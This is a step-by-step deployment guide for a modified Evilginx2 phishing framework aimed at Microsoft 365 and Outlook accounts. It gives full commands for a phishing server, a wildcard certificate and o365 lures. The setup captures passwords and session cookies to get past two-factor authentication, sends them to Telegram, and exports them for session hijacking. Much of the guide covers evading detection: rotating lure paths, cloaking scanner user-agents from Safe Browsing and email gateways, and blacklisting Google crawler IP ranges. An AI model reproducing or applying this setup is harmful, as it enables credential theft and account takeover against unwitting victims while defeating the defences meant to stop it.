# Evilginx2 (Telegram Edition) — Deployment Guide

**From a fresh VPS to a fully operational phishing framework**

---

## WHAT YOU'LL BUILD

| Feature | Description |
|---------|-------------|
| Reverse Proxy Engine | Middleman between victim and real website; captures sessions transparently |
| Session Cookie Capture | Steals authenticated session tokens — bypasses 2FA completely |
| Wildcard SSL Certificate | One cert covers all subdomains; hidden from Certificate Transparency logs |
| Web Dashboard | HTTPS subdomain or port 5000 — view, search, filter, export captured sessions |
| Telegram Alerts | Instant phone notifications on credential capture |
| GeoIP Tracking | Country, city, ISP, VPN/proxy status per visitor |
| Redirect Pages | Custom HTML pages served on subdomains with optional Cloudflare Turnstile gate |
| VPN/Country Blocking | Block VPN users and/or entire countries |
| Cloudflare Turnstile | CAPTCHA challenge before victims see the login page |
| Header Stripping | Removes Evilginx fingerprints from HTTP responses |
| Blacklist System | Blocks repeat/unauthorized visitors |
| Auto-Start on Boot | Survives VPS reboots |

---

## REQUIREMENTS

| Item | Example |
|------|---------|
| VPS (Ubuntu 22.04 or 24.04) | 1 CPU, 1 GB RAM, 10 GB SSD |
| Domain name | `yoursite.com` |
| Cloudflare account (free) | https://dash.cloudflare.com |
| Telegram account | For bot creation |

---

# PART 1: CONNECT TO YOUR VPS

```bash
ssh root@YOUR_VPS_IP
```

Type `yes` to accept the host key, then enter your password.

---

# PART 2: SYSTEM PREPARATION

## Update packages

```bash
apt update && apt upgrade -y
```

## Install dependencies

```bash
apt install -y curl wget git make build-essential screen fail2ban htop net-tools ufw certbot nano tar unzip dnsutils
```

## Configure firewall

```bash
ufw allow 22/tcp
ufw allow 53/udp
ufw allow 80/tcp
ufw allow 443/tcp
ufw allow 5000/tcp
ufw --force enable
ufw status numbered
```

All five ports must show `ALLOW`.

## Free port 53 from Ubuntu's resolver

```bash
systemctl stop systemd-resolved
systemctl disable systemd-resolved
rm -f /etc/resolv.conf
echo "nameserver 1.1.1.1" | tee /etc/resolv.conf
echo "nameserver 1.0.0.1" | tee -a /etc/resolv.conf
chattr +i /etc/resolv.conf
```

Verify:

```bash
dig @1.1.1.1 google.com +short
```

Should return an IP address. Then reboot:

```bash
reboot
```

---

# PART 3: INSTALL GO

```bash
cd /tmp
GO_VERSION=$(curl -sL 'https://go.dev/VERSION?m=text' | head -1)
wget "https://go.dev/dl/${GO_VERSION}.linux-amd64.tar.gz"
rm -rf /usr/local/go
tar -C /usr/local -xzf "${GO_VERSION}.linux-amd64.tar.gz"
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version
rm "${GO_VERSION}.linux-amd64.tar.gz"
cd ~
```

For ARM64 VPS, replace `linux-amd64` with `linux-arm64`.

---

# PART 4: CLOUDFLARE + DNS

Do this in your browser.

## Add domain to Cloudflare

1. Go to https://dash.cloudflare.com → Add a Site → enter your domain → select Free
2. Copy the two nameservers Cloudflare assigns
3. In your domain registrar's dashboard, set nameservers to the ones Cloudflare gave you
4. Wait 5–15 minutes for propagation

## Add DNS records

In Cloudflare → DNS → add two A records:

| Type | Name | Value | Proxy |
|------|------|-------|-------|
| A | `@` | Your VPS IP | DNS Only (grey) |
| A | `*` | Your VPS IP | DNS Only (grey) |

**The cloud MUST be grey (DNS Only), NOT orange (Proxied). Orange cloud breaks Evilginx SSL.**

## SSL/TLS settings

Cloudflare → SSL/TLS → Overview → set to **Full**  
Edge Certificates → Always Use HTTPS → ON

## Verify DNS propagation

```bash
dig @1.1.1.1 yoursite.com +short
dig @1.1.1.1 test.yoursite.com +short
```

Both must return your VPS IP.

---

# PART 5: BUILD EVILGINX

Replace `YOUR_PAT` with a GitHub Personal Access Token that has **repo** scope for `michaelinbox02-star/evilginx2`.

```bash
cd /root
git clone https://YOUR_PAT@github.com/michaelinbox02-star/evilginx2.git evilginx2
cd evilginx2
go build -mod=mod -o evilginx2 .
chmod +x evilginx2
ls -lh evilginx2
```

The binary should be approximately 25 MB.

---

# PART 6: WILDCARD SSL CERTIFICATE

A wildcard cert covers all subdomains (`*.yoursite.com`) and keeps them hidden from Certificate Transparency logs.

## Request the certificate

```bash
certbot certonly --manual --preferred-challenges dns -d '*.yoursite.com' -d yoursite.com
```

Follow the prompts:
1. Enter email → Agree to terms (`A`) → Skip EFF email (`N`)
2. Certbot shows a TXT record to add: **do not press Enter yet**

## Add the TXT record

In Cloudflare → DNS → Add record:

| Type | Name | Value | TTL |
|------|------|-------|-----|
| TXT | `_acme-challenge` | (the value certbot shows) | Auto |

Verify propagation in a second terminal:

```bash
dig @1.1.1.1 _acme-challenge.yoursite.com TXT +short
```

Once it shows the value, go back to certbot and press Enter.

✅ Success output:
```
Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/yoursite.com/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/yoursite.com/privkey.pem
```

## Copy certificate to Evilginx

```bash
mkdir -p /root/.evilginx/crt/wildcard
cp /etc/letsencrypt/live/yoursite.com/fullchain.pem /root/.evilginx/crt/wildcard/
cp /etc/letsencrypt/live/yoursite.com/privkey.pem /root/.evilginx/crt/wildcard/
chmod 644 /root/.evilginx/crt/wildcard/fullchain.pem
chmod 600 /root/.evilginx/crt/wildcard/privkey.pem
```

Verify it's a wildcard:

```bash
openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
# Must show: subject = CN = *.yoursite.com
```

---

# PART 7: INITIAL CONFIGURATION

Start Evilginx once to create config files and set up base settings:

```bash
cd /root/evilginx2
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass changeme
```

At the `evilginx>` prompt:

```
config domain yoursite.com
config ipv4 external YOUR_VPS_IP
config autocert on
config unauth_url https://login.microsoftonline.com
config strip_headers on
blacklist unauth
exit
```

**Note:** `autocert on` is required for Evilginx to find and use the wildcard certificate in `~/.evilginx/crt/wildcard/`.

---

# PART 8: TELEGRAM INTEGRATION

## Create a Telegram bot

1. Open Telegram → search `@BotFather` → send `/newbot`
2. Choose a name and username (must end in `bot`)
3. Copy the token BotFather gives you (e.g. `8863425004:AAF7mZ0...`)

## Get your Chat ID

1. Search for your bot in Telegram and send it any message
2. Then run:

```bash
curl -s "https://api.telegram.org/botYOUR_TOKEN/getUpdates"
```

Find `"chat":{"id":XXXXXXXX}` — that number is your Chat ID.

## Configure in Evilginx

```bash
./evilginx2 -dashboard 0.0.0.0:5000 -dashboard-user admin -dashboard-pass changeme
```

```
config teletoken YOUR_BOT_TOKEN
config chatid YOUR_CHAT_ID
config telegram test
exit
```

You should receive a test message in Telegram.

---

# PART 9: GEOIP DATABASE SETUP

GeoIP shows country, city, ISP, and VPN status for each visitor.

```bash
mkdir -p /root/.evilginx/GeoIP
cd /root/.evilginx/GeoIP

# City database
curl -L -o GeoLite2-City.mmdb "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-City.mmdb"

# ASN/ISP database
curl -L -o GeoLite2-ASN.mmdb "https://github.com/P3TERX/GeoLite.mmdb/raw/main/GeoLite2-ASN.mmdb"

ls -lh /root/.evilginx/GeoIP/
```

Both files should be several MB each. If they're only a few KB, the download was rate-limited — try again later or download manually and upload via SCP.

---

# PART 10: START EVILGINX WITH ALL FEATURES

```bash
cd /root/evilginx2
./evilginx2 \
  -dashboard 0.0.0.0:5000 \
  -dashboard-user admin \
  -dashboard-pass changeme \
  -geoip-db /root/.evilginx/GeoIP
```

On startup you should see:
```
[wld] using wildcard certificate for: *.yoursite.com
[inf] wildcard certificate loaded..
[inf] geoip: GeoIP initialized — country tracking active
[dashboard] web interface starting on http://0.0.0.0:5000
```

If you don't see the wildcard messages, check that:
- Both files exist in `/root/.evilginx/crt/wildcard/`
- The cert subject is `CN = *.yoursite.com`
- `autocert` is enabled (`config autocert on`)

---

# PART 11: PHISHLETS AND LURES

## Set up the o365 phishlet

The `o365` phishlet captures credentials and session cookies for both **Office 365 work/school accounts** and **personal Outlook/Hotmail accounts**.

```
phishlets hostname o365 yoursite.com
phishlets enable o365
```

## Create a lure

```
lures create o365
```

You can also specify a custom subdomain for the lure:

```
lures create o365 login
```

This sets the phishing URL to `https://login.yoursite.com/<token>` instead of auto-assigning a subdomain.

Get the phishing URL:

```
lures get-url 0
```

The URL is what you send to targets. When they visit it and log in, credentials and session cookies are captured and sent to Telegram.

**Note on social login options:** The o365 phishlet routes through the enterprise OAuth flow which suppresses Google/Apple social login options that appear on Microsoft's consumer login page — the phishing page matches the official enterprise login experience.

## Clone a lure

Duplicate a lure with all its settings (hostname, redirect URL, OG tags, etc.) but a fresh random path:

```
lures clone 0
```

Useful when running multiple campaigns with the same phishlet configuration — clone the base lure once, then send different URLs to different targets without setting everything up from scratch.

## Reload a phishlet without restarting

After editing a phishlet YAML file (updating a JS injection, fixing a subfilter, etc.), reload it live:

```
phishlets reload o365
```

The change takes effect immediately. If the phishlet was enabled, active hostnames and certificates are refreshed automatically. If the YAML has a syntax error, the existing phishlet stays in memory untouched.

## Auto-rotating lures (autolures)

An autolure keeps the phishing path hidden until a real visitor arrives. You share a permanent **gateway URL** (root of the subdomain) — visiting it redirects the browser to the current active path, which rotates automatically on a timer. Scanner UAs are blocked before the redirect fires, so crawlers never see where the phishing content lives.

```
[target gets this]  https://login.yoursite.com
                            ↓ (302 on real browser click)
[actual content]    https://login.yoursite.com/iirr94lsl
                            ↓ (auto-rotates every N minutes)
[new path]          https://login.yoursite.com/xq9pw3kl
```

**Create an autolure:**

```
autolures create o365 login
```

Creates an autolure on `login.yoursite.com` with a random rotation interval (45–90 min). You always share `https://login.yoursite.com` — never the path.

**With a fixed rotation interval:**

```
autolures create o365 login 1h
autolures create o365 login 30m
autolures create o365 login 2h30m
```

**List all autolures** (shows countdown to next rotation):

```
autolures
```

**Get the current active URL:**

```
autolures get-url 0
```

**Toggle Telegram notification on rotation:**

```
autolures notify 0 off    ← disable (default: on)
autolures notify 0 on     ← re-enable
```

Every time the path rotates, a Telegram message is sent with:
- The gateway URL (the permanent link you share)
- The new active path
- The timestamp of the next rotation

**Delete an autolure:**

```
autolures delete 0
```

> **How it protects against scanners:** Email security gateways pre-scan links before the target sees them. With a regular lure the full path URL is in the email — the scanner can flag it. With an autolure only `https://login.yoursite.com` is in the email. The scanner hits the root, gets the `unauth_url` content (cloaked), and marks the domain clean. The active path is never exposed in the email.

---

# PART 12: WEB DASHBOARD

## Access via port

```
http://YOUR_VPS_IP:5000
```

Login with the credentials you set (`-dashboard-user` / `-dashboard-pass`).

## Access via HTTPS subdomain (recommended)

Assign the dashboard to a subdomain of your config domain so it's accessible over HTTPS with your wildcard cert:

```
config dashboardsub panel
```

This makes the dashboard available at `https://panel.yoursite.com`. The wildcard cert covers it automatically — no extra cert needed.

To unassign, set it to empty:

```
config dashboardsub ""
```

## Live credential updates

To change dashboard login credentials without restarting:

```
config dashboard-user newuser
config dashboard-pass newpassword
```

Changes take effect immediately — the next login attempt will require the new credentials.

## Dashboard features

- Session table: ID, phishlet, username, password, IP, token status, timestamp
- Click any row to see full detail: cookies, tokens, GeoIP data
- **Inject Session** button — appears in the detail panel when tokens are present; exports cookies in Cookie-Editor JSON format for direct browser import
- Search by username, password, IP, phishlet
- Export to CSV or JSON
- Dark mode toggle
- Auto-refresh every 5 seconds

---

# PART 13: REDIRECT PAGES

Redirect pages are custom HTML files you serve on subdomains. Visitors who land on a redirect page see your HTML content and optionally get redirected to another URL. Useful for pre-phishing landing pages, fake loading screens, or social engineering flows.

## Setup

Place HTML files in `~/.evilginx/redirects/`:

```bash
mkdir -p /root/.evilginx/redirects
# Copy your HTML file there:
cp /path/to/loading.html /root/.evilginx/redirects/
```

## Assign a redirect page to a subdomain

In the Evilginx terminal:

```
redirects add <subdomain> <filename> [target_url] [on|off]
```

**Examples:**

```
# Page handles its own redirect (URL baked into the HTML)
redirects add landing loading.html

# Page redirects to a URL after loading
redirects add landing loading.html https://target.com/path

# Page shows Cloudflare Turnstile challenge, then redirects
redirects add landing loading.html https://target.com/path on

# Page shows Turnstile, but redirect is in the HTML itself
redirects add landing loading.html on
```

- `<subdomain>` — subdomain under your config domain (e.g. `landing` → `https://landing.yoursite.com`)
- `<filename>` — filename of the HTML file inside `~/.evilginx/redirects/`
- `[target_url]` — optional; if omitted, the HTML handles its own redirect
- `[on|off]` — optional; `on` enables Cloudflare Turnstile gate (requires `-turnstile` flag at startup)

## List and delete redirect pages

```
redirects list
redirects delete 0
```

## Notes

- The wildcard cert covers all redirect page subdomains automatically
- Multiple redirect pages can be active simultaneously
- If `target_url` is set, the redirect URL is injected into the HTML before `</body>`
- If Turnstile is enabled, visitors must pass the challenge before being redirected

---

# PART 14: AUTO-START ON BOOT (SYSTEMD)

## Create the service file

```bash
nano /etc/systemd/system/evilginx.service
```

Paste:

```ini
[Unit]
Description=Evilginx2 Telegram Edition
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=/root/evilginx2
ExecStart=/root/evilginx2/evilginx2 \
    -dashboard 0.0.0.0:5000 \
    -dashboard-user admin \
    -dashboard-pass changeme \
    -geoip-db /root/.evilginx/GeoIP
Restart=always
RestartSec=5
LimitNOFILE=65535
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

Save: `Ctrl+X` → `Y` → `Enter`

## Enable and start

```bash
systemctl daemon-reload
systemctl enable evilginx
systemctl start evilginx
systemctl status evilginx
```

Status should show `active (running)`.

## View logs

```bash
journalctl -u evilginx -f
```

Press `Ctrl+C` to stop watching.

---

# PART 15: CERTIFICATE AUTO-RENEWAL

Let's Encrypt certs expire after 90 days. For manual renewal every 60–80 days:

```bash
# Delete old TXT record from Cloudflare first, then:
certbot certonly --manual --preferred-challenges dns -d '*.yoursite.com' -d yoursite.com

# After certbot succeeds, copy new certs:
cp /etc/letsencrypt/live/yoursite.com/fullchain.pem /root/.evilginx/crt/wildcard/
cp /etc/letsencrypt/live/yoursite.com/privkey.pem /root/.evilginx/crt/wildcard/
chmod 644 /root/.evilginx/crt/wildcard/fullchain.pem
chmod 600 /root/.evilginx/crt/wildcard/privkey.pem
systemctl restart evilginx
```

---

# PART 16: OPTIONAL FEATURES

## Cloudflare Turnstile CAPTCHA

Adds a CAPTCHA challenge before victims reach the phishing page — filters out scanners and bots.

1. Cloudflare dashboard → Turnstile → Add a site
2. Copy the **Site Key** and **Secret Key**

Add to the systemd service `ExecStart`:

```ini
ExecStart=/root/evilginx2/evilginx2 \
    -dashboard 0.0.0.0:5000 \
    -dashboard-user admin \
    -dashboard-pass changeme \
    -geoip-db /root/.evilginx/GeoIP \
    -turnstile SITEKEY:SECRETKEY
```

Reload: `systemctl daemon-reload && systemctl restart evilginx`

Turnstile also works on redirect pages — set the `on` flag when adding a redirect page (see Part 13).

## Block VPN visitors

```ini
ExecStart=... -block-vpn
```

Requires GeoIP database.

## Block specific countries

```ini
ExecStart=... -block-countries RU,CN,IR,KP
```

Use ISO 3166-1 alpha-2 country codes. Requires GeoIP database.

## Scanner UA Cloaking (Anti-Safe-Browsing)

Evilginx Telegram Edition has built-in scanner UA detection. Any request whose `User-Agent` matches a known security crawler or scanner is intercepted **before** it reaches any phishing logic and is served the content of your `unauth_url` instead — so Google Safe Browsing, PhishTank, link previewers (WhatsApp, Telegram, Discord, Slack), and generic HTTP clients (curl, python-requests, etc.) all see a legitimate page. Their IP is also auto-blacklisted so subsequent requests are dropped at the IP level.

**Detected categories:**
- Google Safe Browsing (`Google-SafeBrowsing`, `Googlebot`, `AdsBot-Google`)
- Phishing feeds (`PhishTank`, `OpenPhish`)
- Generic clients (`curl`, `wget`, `python-requests`, `python-urllib`, `go-http-client`, `libwww-perl`, `java/`, `okhttp/`)
- Security scanners (`nuclei`, `sqlmap`, `nikto`, `masscan`, `zgrab`, `nessus`, `burpsuite`)
- Search crawlers (`Bingbot`, `YandexBot`, `Slurp`, `DuckDuckBot`, `Baiduspider`)
- Link previewers (`facebookexternalhit`, `Twitterbot`, `LinkedInBot`, `WhatsApp`, `TelegramBot`, `Discordbot`, `Slackbot`)

**Required config (already set in Part 7):**

```
config unauth_url https://login.microsoftonline.com
blacklist unauth
```

`unauth_url` is what scanners receive as the spoofed page. Point it at the real login page you are mirroring — scanners will report a clean result.

**Optional: pre-seed Google IP ranges**

Append to `~/.evilginx/blacklist.txt` to block Google crawlers at the IP level before they even make a request:

```
; Google Safe Browsing / crawler ranges
66.249.64.0/19
66.249.80.0/20
66.249.90.0/24
64.233.160.0/19
72.14.192.0/18
74.125.0.0/16
209.85.128.0/17
216.58.192.0/19
216.239.32.0/19
```

Restart evilginx after editing `blacklist.txt` — the file is loaded at startup.

---

# PART 17: COMPLETE COMMAND REFERENCE

## Config commands

| Command | Description |
|---------|-------------|
| `config` | Show all current settings |
| `config domain <domain>` | Set phishing domain |
| `config ipv4 external <ip>` | Set VPS external IP |
| `config autocert on/off` | Enable/disable automatic SSL (needed to load wildcard cert) |
| `config unauth_url <url>` | Redirect unauthorized visitors here |
| `config strip_headers on/off` | Remove Evilginx fingerprints from responses |
| `config teletoken <token>` | Telegram bot token |
| `config chatid <id>` | Telegram chat ID |
| `config dashboardsub <sub>` | Set dashboard HTTPS subdomain (e.g. `panel`) |
| `config dashboard-user <user>` | Update dashboard username (live, no restart needed) |
| `config dashboard-pass <pass>` | Update dashboard password (live, no restart needed) |

## Redirect page commands

| Command | Description |
|---------|-------------|
| `redirects list` | List all configured redirect pages |
| `redirects add <sub> <file> [url] [on\|off]` | Add redirect page on subdomain |
| `redirects delete <index>` | Remove a redirect page |

**`redirects add` syntax:**

```
# Serve file as-is (HTML handles its own redirect)
redirects add landing loading.html

# Redirect to URL after page loads
redirects add landing loading.html https://target.com

# Redirect to URL after Turnstile challenge
redirects add landing loading.html https://target.com on

# Serve file as-is, but with Turnstile gate
redirects add landing loading.html on
```

## Phishlet commands

| Command | Description |
|---------|-------------|
| `phishlets hostname <name> <domain>` | Set phishlet domain |
| `phishlets enable <name>` | Enable a phishlet |
| `phishlets disable <name>` | Disable a phishlet |
| `phishlets hide <name>` | Hide phishlet (redirect all non-lure traffic) |
| `phishlets unhide <name>` | Unhide phishlet |
| `phishlets reload <name>` | Re-read phishlet YAML from disk without restarting |
| `phishlets list` | List all phishlets and status |

## Lure commands

| Command | Description |
|---------|-------------|
| `lures create <phishlet> [subdomain]` | Create lure; optionally pin to a subdomain |
| `lures get-url <index>` | Get the phishing URL |
| `lures list` | List all lures |
| `lures clone <index>` | Duplicate a lure with all its settings and a new random path |
| `lures delete <index>` | Delete a lure |
| `lures edit <index> <field> <value>` | Edit lure settings (path, hostname, redirect_url, info, og_title, og_desc, og_image, og_url, ua_filter, redirector) |
| `lures pause <index> <duration>` | Pause a lure (e.g. `1h`, `30m`) |
| `lures unpause <index>` | Unpause a lure |

## Autolure commands

| Command | Description |
|---------|-------------|
| `autolures` | List all auto-rotating lures with countdown |
| `autolures create <phishlet> <subdomain> [interval]` | Create autolure (interval e.g. `1h`, `30m`; default random 45-90m) |
| `autolures get-url <id>` | Show gateway URL and current active path |
| `autolures notify <id> on\|off` | Enable/disable Telegram notification on rotation |
| `autolures delete <id>` | Delete an autolure |

## Session commands

| Command | Description |
|---------|-------------|
| `sessions` | List all sessions |
| `sessions <id>` | Show session detail (cookies, tokens, GeoIP) |
| `sessions delete <id>` | Delete a session |

## Blacklist commands

| Command | Description |
|---------|-------------|
| `blacklist all` | Block everyone except whitelisted IPs |
| `blacklist unauth` | Block unauthorized visitors only (recommended) |
| `blacklist noadd` | Redirect but don't add to blacklist |
| `blacklist off` | Disable blacklist |
| `blacklist log on/off` | Toggle verbose blacklist logging |

> **Scanner UA cloaking is automatic** — known crawlers and security scanners (GSB, PhishTank, curl, python-requests, link previewers, etc.) are intercepted before any phishing logic runs and served the `unauth_url` content. Set `blacklist unauth` and `config unauth_url` to activate.

## System commands

| Command | Description |
|---------|-------------|
| `config telegram test` | Send a test Telegram message |
| `clear` | Clear the terminal |
| `help` | List all commands |
| `exit` | Exit Evilginx (saves config) |

## Systemd commands

```bash
systemctl start evilginx       # Start
systemctl stop evilginx        # Stop
systemctl restart evilginx     # Restart
systemctl status evilginx      # Check status
journalctl -u evilginx -f      # Live logs
journalctl -u evilginx -n 100  # Last 100 lines
```

---

# PART 18: TROUBLESHOOTING

## Wildcard certificate not loading

```bash
# Check files exist
ls -la /root/.evilginx/crt/wildcard/

# Check it's a wildcard
openssl x509 -in /root/.evilginx/crt/wildcard/fullchain.pem -noout -subject
# Must show: CN = *.yoursite.com

# Check domain is set
cat /root/.evilginx/config.json | grep domain

# Restart after fixing
systemctl restart evilginx
journalctl -u evilginx | grep wildcard
```

## Dashboard not accessible

```bash
systemctl status evilginx         # Is it running?
ufw status | grep 5000            # Is port 5000 open?
ss -tlnp | grep 5000              # Is it listening?
```

For HTTPS subdomain access: ensure `config dashboardsub` is set and the wildcard cert is loaded.

## Dashboard subdomain returns wrong page

The virtual host dispatch happens before phishlet routing. Ensure the subdomain you set with `config dashboardsub` doesn't conflict with any phishlet's assigned subdomain.

## Redirect page not loading

```bash
ls -la /root/.evilginx/redirects/   # Is the file there?
redirects list                       # Is it registered?
```

Verify the subdomain in `redirects list` matches the URL you're visiting.

## DNS not resolving

```bash
dig @1.1.1.1 yoursite.com +short
dig @1.1.1.1 test.yoursite.com +short
```

Both must return your VPS IP. If not, check Cloudflare DNS records are set to DNS Only (grey cloud).

## Port 53 still in use after setup

```bash
lsof -i :53
systemctl stop systemd-resolved
systemctl disable systemd-resolved
reboot
```

## No Telegram notifications

```bash
# Test the token directly
curl -s "https://api.telegram.org/botYOUR_TOKEN/getMe"

# From Evilginx terminal
config telegram test
```

Check that `config teletoken` and `config chatid` are both set.

## GeoIP not showing data

```bash
ls -lh /root/.evilginx/GeoIP/    # Files present?
journalctl -u evilginx | grep geoip
```

Ensure the `-geoip-db` flag points to the directory containing the `.mmdb` files, not to the files themselves.

## Build fails

```bash
cd /root/evilginx2
go clean -modcache
go mod tidy
go build -mod=mod -o evilginx2 .
```

If `go: command not found`, run `source ~/.bashrc` or reconnect SSH.

---

# PART 19: DEPLOYMENT CHECKLIST

### Server
- [ ] SSH works
- [ ] Packages installed
- [ ] Firewall active: ports 22, 53, 80, 443, 5000 open
- [ ] Port 53 free (systemd-resolved disabled)
- [ ] Go installed (`go version`)

### DNS
- [ ] Domain on Cloudflare with Cloudflare nameservers
- [ ] `@` and `*` A records → VPS IP, DNS Only (grey cloud)
- [ ] SSL/TLS set to Full
- [ ] `dig @1.1.1.1 yoursite.com +short` → VPS IP
- [ ] `dig @1.1.1.1 test.yoursite.com +short` → VPS IP

### Wildcard Certificate
- [ ] `fullchain.pem` and `privkey.pem` in `/root/.evilginx/crt/wildcard/`
- [ ] Subject shows `CN = *.yoursite.com`
- [ ] Startup shows `[wld] using wildcard certificate`

### Evilginx Config
- [ ] `config domain` set
- [ ] `config ipv4 external` set
- [ ] `config autocert on`
- [ ] `config unauth_url https://login.microsoftonline.com` set
- [ ] `blacklist unauth` set
- [ ] `config teletoken` and `config chatid` set
- [ ] `config telegram test` succeeds

### GeoIP
- [ ] `GeoLite2-City.mmdb` and `GeoLite2-ASN.mmdb` in `/root/.evilginx/GeoIP/`
- [ ] Startup shows `GeoIP initialized`

### Phishlet
- [ ] `phishlets hostname o365 yoursite.com`
- [ ] `phishlets enable o365`
- [ ] Lure created and URL works in browser
- [ ] Login page matches official Microsoft login

### Dashboard
- [ ] Accessible at `http://IP:5000`
- [ ] If subdomain configured: `https://panel.yoursite.com` works over HTTPS
- [ ] Login works, sessions visible

### Systemd
- [ ] Service file created with correct flags
- [ ] `systemctl enable evilginx` done
- [ ] Status shows `active (running)`

### Optional
- [ ] Redirect pages added to `~/.evilginx/redirects/` and configured
- [ ] Turnstile enabled (if using)
- [ ] VPN/country blocking configured (if using)

---

*Evilginx2 Telegram Edition by @officialmonsterz*  
*Based on original work by Kuba Gretzky (@mrgretzky)*
